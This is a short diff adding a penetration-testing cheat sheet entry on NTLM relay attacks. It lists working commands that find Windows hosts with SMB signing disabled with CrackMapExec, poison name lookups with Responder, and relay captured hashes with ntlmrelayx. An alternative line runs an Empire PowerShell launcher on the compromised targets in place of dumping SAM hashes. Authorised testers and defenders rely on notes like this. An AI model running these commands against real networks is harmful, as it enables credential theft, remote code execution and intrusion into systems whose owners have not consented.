@@ -1,0 +1,25 @@
+=== NTLM Relay
+
+This attack answers any request for name lookup with itself, then reuses hashes received by those requests in new requests to other systems.
+
+1. Generate a list of targets with SMB Signing disabled.
+
+  cme smb <CIDR> --gen-relay-list targets.txt
+
+2. Start `ntlmrelayx` to catch SMB and HTTP requests and reuse their hashes against the targets.
+
+  ntlmrelayx.py -tf targets.txt -smb2support
+
+3. Start responder on the LAN interface to attract requests.
+
+  python Responder.py -I <interface> -r -d -w -P
+
+==== Alternatives
+
+  ntlmrelayx.py -tf targets.txt -c <insert your Empire Powershell launcher here>
+
+Run empire launcher instead of the default process of dumping account hashes from the SAM database.
+
+
+==== Reference
+- https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html
